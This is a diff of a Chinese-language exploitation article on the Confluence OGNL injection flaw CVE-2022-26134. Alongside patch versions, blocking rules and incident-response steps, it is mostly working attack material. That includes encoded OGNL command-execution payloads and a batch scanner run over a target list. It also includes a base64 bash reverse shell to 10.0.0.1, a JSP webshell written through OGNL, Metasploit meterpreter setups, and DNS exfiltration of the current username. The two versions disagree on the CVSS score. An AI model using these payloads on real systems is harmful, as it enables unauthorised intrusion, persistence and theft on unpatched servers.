@@ -1,262 +1,269 @@
-# Confluence Server OGNL 注入远程代码执行（CVE-2022-26134）漏洞分析与 EXP
+# Confluence OGNL 注入漏洞完整分析 (CVE-2022-26134)
+
+> 📅 2026-06-12 | 🎯 精通 | ⏱ 20 min | 分类：漏洞库与EXP
+
+## 📋 提纲
+
+1. 漏洞概述
+2. Atlassian Confluence 架构与 OGNL
+3. 漏洞原理深度分析
+4. 漏洞检测
+5. 完整利用复现
+6. 漏洞修复
+7. 护网中的 Confluence
+
+---
 
 ## 1. 漏洞概述
 
-CVE-2022-26134 是 Atlassian Confluence Server / Data Center 中的一个**远程代码执行**漏洞。当攻击者访问形如 `/${ognl-expression}/` 的 URL 时，Confluence 会把 URI 中的表达式当作 **OGNL（Object-Graph Navigation Language）** 进行解析执行。由于 OGNL 可以调用 Java 方法并实例化对象，攻击者可以在无认证的情况下执行任意代码。
+**CVE-2022-26134**
+- CVSS: 9.8（最高危）
+- 类型：OGNL 表达式注入 → RCE
+- 影响：Confluence Server / Data Center 1.3.0 ~ 7.18.0
+- 前提：无需认证
+- 公开：2022年6月2日
 
-| 项目 | 说明 |
-|------|------|
-| CVE 编号 | CVE-2022-26134 |
-| 漏洞类型 | 未授权 OGNL 表达式注入 → RCE |
-| 发现时间 | 2022 年 6 月 2 日公开 |
-| CVSS 评分 | 10.0（Critical） |
-| 影响组件 | Confluence Server / Confluence Data Center |
-| 攻击前置 | Confluence HTTP 端口（默认 8090）可达；无需登录 |
+### 1.1 历史高危
 
-## 2. 影响版本
+Confluence 历年来多次出现预认证 RCE：
+- CVE-2019-3396: Widget Connector SSTI → RCE
+- CVE-2021-26084: OGNL 注入
+- CVE-2022-26134: OGNL 注入（本次）
+- CVE-2023-22515: 权限提升 + 管理员创建
 
-| Confluence | 受影响 | 首个修复版本 |
-|-----------|--------|-------------|
-| 1.3.0 ~ 7.4.17 | 是 | 7.4.17 LTS |
-| 7.13.0 ~ 7.13.7 | 是 | 7.13.7 LTS |
-| 7.14.0 ~ 7.14.3 | 是 | 7.14.3 |
-| 7.15.0 ~ 7.15.2 | 是 | 7.15.2 |
-| 7.16.0 ~ 7.16.4 | 是 | 7.16.4 |
-| 7.17.0 ~ 7.17.4 | 是 | 7.17.4 |
-| 7.18.0 ~ 7.18.1 | 是 | 7.18.1 |
+---
 
-Confluence Cloud（托管版）不受影响。
+## 2. OGNL 表达式引擎
+
+### 2.1 什么是 OGNL
+
+```
+OGNL（Object-Graph Navigation Language）= Java 的对象图导航语言
+类似：EL 表达式、SpEL、JEXL
+
+OGNL 表达式示例：
+${1+1}                         → 数学计算
+${#session.user.name}          → 访问Session属性  
+${@java.lang.Runtime@getRuntime().exec('id')} → 命令执行！
+```
+
+### 2.2 为什么危险
+
+OGNL 设计为可以访问任意Java对象和方法，包括 `Runtime.getRuntime().exec()`。
+
+Confluence 使用 OGNL 作为模板引擎来处理部分URL。
+
+---
 
 ## 3. 漏洞原理
 
-### 3.1 OGNL 简介
-
-OGNL 是一种 Java 表达式语言，可以通过表达式动态调用对象上的属性与方法。例如：
-
-```ognl
-@java.lang.Runtime@getRuntime().exec("whoami")
-```
-
-这会调用 `Runtime.getRuntime().exec("whoami")`。
-
-### 3.2 触发点
-
-Confluence 的 **XWork / OGNL 命名空间解析逻辑**会把 URL 路径的一部分当作 OGNL 表达式进行解析。简化流程：
+### 3.1 漏洞触发点
 
 ```
-攻击者访问: /${@java.lang.Runtime@getRuntime().exec("id")}/
+URL Path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
 
-  Confluence 处理 URL：
-    1) 解析路径，把 ${...} 当作 namespace
-    2) 把 namespace 传递给 XWork
-    3) XWork 使用 OGNL 解析该字符串
-    4) 执行表达式 → Runtime.exec("id")
-    5) 结果不会直接回显（需要配合文件写入 / DNSLog / 反弹 shell）
+URL解码：
+/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/
+
+Confluence 在处理包含 OGNL 表达式的 URL 时：
+1. URL解码 ${...}
+2. OGNL 引擎解析并执行表达式
+3. 表达式调用 Runtime.exec() → RCE
+4. 结果通过HTTP响应头返回
 ```
 
-### 3.3 简单 PoC（非破坏性，版本指纹）
+### 3.2 漏洞代码路径
 
 ```
-GET /%24%7B233*233%7D/ HTTP/1.1
-Host: target:8090
-
-# 响应中出现 "54289"（233*233 = 54289）即证明 OGNL 表达式被执行
+请求进入 → ServletDispatcher → ActionMapping →
+匹配不到Action → 返回404页面 →
+但！在处理请求过程中，Confluence对URL中的 %2F 做了特殊处理 →
+使用OGNL解析URL中的值 → OGNL表达式被执行
 ```
 
-## 4. 公开 EXP
+---
 
-### 4.1 基础命令执行（curl 版）
-
-```bash
-# 1) OGNL 表达式：Runtime.getRuntime().exec("id")
-# URL 编码后：
-CMD="id"
-PAYLOAD="${@java.lang.Runtime@getRuntime().exec(\"${CMD}\")}"
-# 再 URL 编码：
-ENCODED=$(python3 -c "import urllib.parse;print(urllib.parse.quote('${PAYLOAD}'))")
-curl -v "http://target:8090/$ENCODED/"
-
-# 观察：目标若执行了表达式，可能返回非标准页面
-# 注意：此 payload 无回显（命令结果不会出现在响应中），需要其他方法验证
-```
-
-### 4.2 回显版（执行命令并写入 HTML 响应的 Confluence 页面）
-
-```bash
-# 通过 OGNL 操作 Servlet 上下文，把执行结果写入响应
-# 表达式：
-# ${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream())}
-
-# 完整请求：
-curl -v "http://target:8090/\$\{@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\`id\`).getInputStream())\}/" \
-    2>&1 | grep -A 30 "uid="
-
-# 响应中将出现：uid=0(root) gid=0(root) ...
-```
-
-### 4.3 写入 WebShell
-
-```bash
-# 通过 OGNL 把命令输出写入 webapps/confluence/shell.jsp
-# 表达式（示意）：
-# ${new java.io.FileWriter("/opt/atlassian/confluence/confluence/shell.jsp").append("<%@ page import=\"java.io.*\"%><%...%>").close()}
-
-# 实际 EXP 脚本（Python）：
-python3 CVE-2022-26134.py --target http://target:8090 --cmd "cat /etc/passwd"
-# [+] Shell written to /opt/atlassian/confluence/confluence/SHELL.jsp
-# [+] GET /SHELL.jsp?cmd=whoami → RCE
-```
-
-### 4.4 Python EXP 脚本（简化版）
+## 4. 漏洞检测
 
 ```python
-# CVE-2022-26134_poc.py
+#!/usr/bin/env python3
+"""CVE-2022-26134 检测"""
+
 import requests
-import sys
-import re
+import urllib.parse
+import urllib3
+urllib3.disable_warnings()
 
-def exploit(target, cmd):
-    # OGNL 表达式：使用 ProcessBuilder 执行命令并把结果写入响应
-    ognl = f"""${{@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("{cmd}").getInputStream())}}"""
-    url = target.rstrip("/") + "/" + ognl
+def detect_cve_2022_26134(target):
+    target = target.rstrip('/')
+
+    # 方法1: DNS外带检测（最安全）
+    interact_domain = "xxx.oastify.com"
+    ognl_payload = f'${{@java.lang.Runtime@getRuntime().exec("nslookup $(whoami).{interact_domain}")}}'
+    encoded = urllib.parse.quote(ognl_payload, safe='')
+
     try:
-        r = requests.get(url, timeout=15, verify=False, allow_redirects=False)
-        # 提取命令输出（通常在 HTML 的 <title> 或 body 中）
-        m = re.search(r"uid=\d+", r.text)
-        if m:
-            print("[+] Vulnerable. Response snippet:")
-            print(r.text[:1000])
-        else:
-            print("[-] Not vulnerable or no output returned")
-    except Exception as e:
-        print(f"[!] Error: {e}")
+        resp = requests.get(
+            f"{target}/{encoded}/",
+            verify=False,
+            timeout=15
+        )
+        print(f"[DNS外带] 状态: {resp.status_code} - 检查Burp Collaborator/Interactsh")
+    except:
+        pass
 
-if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print(f"Usage: {sys.argv[0]} http://target:8090 'id'")
-        sys.exit(1)
-    exploit(sys.argv[1], sys.argv[2])
+    # 方法2: 命令执行回显检测
+    cmd = "id"
+    ognl_payload = (
+        '${'
+        '(#a=@org.apache.commons.io.IOUtils@toString('
+        '@java.lang.Runtime@getRuntime().exec("' + cmd + '").getInputStream(),"utf-8"))'
+        '.(@com.opensymphony.webwork.ServletActionContext@getResponse()'
+        '.setHeader("X-Cmd-Response",#a))'
+        '}'
+    )
+    encoded = urllib.parse.quote(ognl_payload, safe='')
+
+    try:
+        resp = requests.get(
+            f"{target}/{encoded}/",
+            verify=False,
+            timeout=15,
+            allow_redirects=False
+        )
+
+        cmd_result = resp.headers.get('X-Cmd-Response', '')
+        if cmd_result:
+            return {
+                "vulnerable": True,
+                "method": "命令回显",
+                "cmd": cmd,
+                "result": cmd_result[:200]
+            }
+
+        # 即使没有回显，如果状态不是404也值得怀疑
+        if resp.status_code in [200, 302]:
+            return {
+                "vulnerable": True,
+                "method": "状态码异常",
+                "status_code": resp.status_code
+            }
+    except:
+        pass
+
+    return {"vulnerable": False}
 ```
 
-### 4.5 MSF 模块
-
-```
-msf6 > use exploit/multi/http/atlassian_confluence_unauthenticated_code_execution
-msf6 exploit(...) > set RHOSTS target
-msf6 exploit(...) > set RPORT 8090
-msf6 exploit(...) > set PAYLOAD java/jsp_shell_reverse_tcp
-msf6 exploit(...) > set LHOST attacker.com
-msf6 exploit(...) > exploit
-```
-
-### 4.6 Nuclei / 一键扫描
+### 4.2 批量检测
 
 ```bash
-# Nuclei 公开 PoC（检测）
-nuclei -u http://target:8090 -t http/cves/2022/CVE-2022-26134.yaml
+#!/bin/bash
+# 批量Confluence检测
+while IFS= read -r url; do
+    echo "检测: $url"
 
-# 批量扫描
-nuclei -l targets.txt -t http/cves/2022/CVE-2022-26134.yaml -o results.txt
+    # 发送无害的echo探测
+    resp=$(curl -sk -o /dev/null -w "%{http_code}" \
+        "$url/\$%7B%22test%22%7D/" 2>/dev/null)
+
+    if [ "$resp" == "302" ] || [ "$resp" == "200" ]; then
+        # 进一步验证
+        cmd_resp=$(curl -sk -D - "$url/\$%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20vulnerable%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/" 2>/dev/null)
+
+        if echo "$cmd_resp" | grep -q "vulnerable"; then
+            echo "  🔴 漏洞确认: $url"
+            echo "$url" >> confluence_vuln.txt
+        fi
+    fi
+done < targets.txt
 ```
 
-## 5. 漏洞检测
+---
 
-### 5.1 版本检测
+## 5. 完整利用
+
+### 5.1 无回显 → 回显
 
 ```bash
-# 1) 访问 Confluence 登录页，HTML 中通常包含版本信息
-curl -s "http://target:8090/login.action" | grep -oE "[0-9]+\.[0-9]+\.[0-9]+" | head -5
-
-# 2) 访问 Confluence 登录页 title 标签，可能含 "Confluence 7.13.0" 字样
-curl -s "http://target:8090/" | grep -iE "Confluence [0-9]"
-
-# 3) 如果已登录管理员：访问 /admin/confluence/action/showPage.action → 看版本信息
+# 如果默认payload没有回显，换用这个（通过Header返回）
+curl -sk "https://target.com/\$%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" -D - | grep X-Cmd-Response
 ```
 
-### 5.2 非破坏性 PoC（仅验证表达式执行）
+### 5.2 反弹Shell
 
 ```bash
-# 让 OGNL 计算 233*233，返回结果如果包含 54289 说明存在漏洞
-curl -s "http://target:8090/\$\{233*233\}/" | grep "54289"
+# 反弹Shell Payload
+# bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'
 
-# 响应中出现 54289 → 漏洞存在（无需登录）
+PAYLOAD='bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
+
+curl -sk "https://target.com/\$%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28new%20String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22$PAYLOAD%22%7D%29%7D/"
 ```
 
-### 5.3 DNSLOG 验证（不出网但能 DNS 的场景）
+### 5.3 写入WebShell
 
 ```bash
-# 执行 nslookup attacker.dnslog.cn，通过 DNS 查询判断漏洞
-curl -s "http://target:8090/\$\{@java.lang.Runtime@getRuntime().exec(\`nslookup%20attacker.dnslog.cn\`)\}/"
-# 然后在 dnslog 平台观察是否收到查询
+# 找到Confluence安装目录，写入JSP Webshell
+WEB_ROOT="/opt/atlassian/confluence/confluence"
+
+# 通过OGNL写入
+curl -sk "https://target.com/\$%7Bnew%20java.io.FileOutputStream%28%22${WEB_ROOT}/shell.jsp%22%29.write%28new%20String%28%22%3C%25%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%5C%22cmd%5C%22%29%29%3B%20%25%3E%22%29.getBytes%28%29%29%7D/"
 ```
+
+### 5.4 Metasploit
+
+```bash
+msf6 > use exploit/multi/http/atlassian_confluence_ognl_injection
+msf6 > set RHOSTS 192.168.1.100
+msf6 > set TARGETURI /
+msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 10.0.0.1
+msf6 > run
+```
+
+---
 
 ## 6. 修复方案
 
-| 方案 | 说明 |
-|------|------|
-| **升级到 Confluence 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1+** | 官方根本修复 |
-| **官方临时缓解补丁**（无法立即升级时） | 下载官方 cve-2022-26134.jar 并安装 |
-| **WAF 拦截** | 拦截 URL 路径中 `${` / `%24%7B` |
-| **反向代理层过滤** | 在 Nginx 中拦截 `/$%7B` 开头路径 |
-| **启用 Confluence 安全配置** | 确保仅限内网访问；禁用不必要的公开接口 |
+### 6.1 升级版本
 
-### 6.1 官方临时补丁使用（不升级情况下）
+```
+受影响的Confluence版本：1.3.0 ~ 7.18.0
+
+安全版本：
+- 7.4.17
+- 7.13.7
+- 7.14.3
+- 7.15.2
+- 7.16.4
+- 7.17.4
+- 7.18.1
+```
+
+### 6.2 临时缓解
 
 ```bash
-# 下载官方 jar 补丁
-# https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
+# 方法1: 添加 rewrite 规则阻断
+# Apache/Nginx 添加：
+RewriteRule ^/.*\$%7B.*%7D/ /blocked [R=403,L]
 
-# 放置补丁到 <confluence-install>/confluence/WEB-INF/lib/
-cp cve-2022-26134.jar /opt/atlassian/confluence/confluence/WEB-INF/lib/
+# 方法2: 关闭Confluence（如果不能立即打补丁）
+systemctl stop confluence
 
-# 重启 Confluence
-systemctl restart confluence
+# 方法3: IP白名单限制访问
+iptables -A INPUT -p tcp --dport 8090 -s 10.0.0.0/8 -j ACCEPT
+iptables -A INPUT -p tcp --dport 8090 -j DROP
 ```
 
-### 6.2 Nginx 反向代理临时规则
+---
 
-```nginx
-# 在 server 块中添加
-if ($request_uri ~* "\$\{|%24%7B") {
-    return 403;
-}
-```
+## ✅ Confluence Checklist
 
-## 7. 应急响应
+- [ ] 全网Confluence版本扫描
+- [ ] OGNL注入检测
+- [ ] 升级到安全版本
+- [ ] WAF/反向代理规则阻断
+- [ ] 入侵排查（日志分析）
+- [ ] 护网前确认修复
 
-```
-发现迹象：
-  - access.log 中出现 `%24%7B` 或 `/${` 形式的请求
-  - 出现 `Runtime@getRuntime@exec` / `IOUtils@toString` 等字符串
-  - Confluence 目录下出现陌生 .jsp 文件
-  - 操作系统出现异常进程（反向 shell / curl 外连）
-  - CPU 异常升高（加密货币挖矿）
-
-处理步骤：
-  ① 立即断网或阻断 Confluence 入站（尤其是 8090 端口）
-  ② 备份整个 Confluence 目录（保留证据）
-  ③ 排查 webapps/confluence/ 目录下的陌生 .jsp / .jspx 文件
-  ④ 查看 <confluence-home>/logs/ / <confluence-install>/logs 日志
-  ⑤ 检查操作系统账户是否被新增
-  ⑥ 检查 cron / 计划任务 / systemd service 等持久化
-  ⑦ 升级 Confluence 到安全版本或安装临时补丁
-  ⑧ 重置数据库密码、管理员凭据、API Token
-  ⑨ 检查是否有数据库/Confluence 数据被导出
-```
-
-## 8. 漏洞复现靶机
-
-```
-推荐环境：
-  - vulhub: docker-compose up -d confluence/CVE-2022-26134
-  - 其他：atlassian/confluence:7.13.2
-
-复现步骤：
-  1) 启动 docker，等待 Confluence 初始化（约 3~5 分钟）
-  2) curl http://target:8090/（访问首页）
-  3) 提交 payload：/${233*233}/  → 响应中出现 54289
-  4) 使用命令执行版 payload：
-     curl "http://target:8090/\$\{@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())\}/"
-```
-
-> CVE-2022-26134 是一个典型的"公开日 → 大规模挖矿"级别的漏洞。Confluence 是企业知识库系统中最常用的产品之一，暴露面广。如果你的组织使用了 Confluence Server/Data Center，**务必升级到安全版本或安装官方临时补丁**。
+> 📚 延伸阅读：Vuln/002-Log4Shell | Vuln/009-Spring4Shell | CTF/009-JNDI
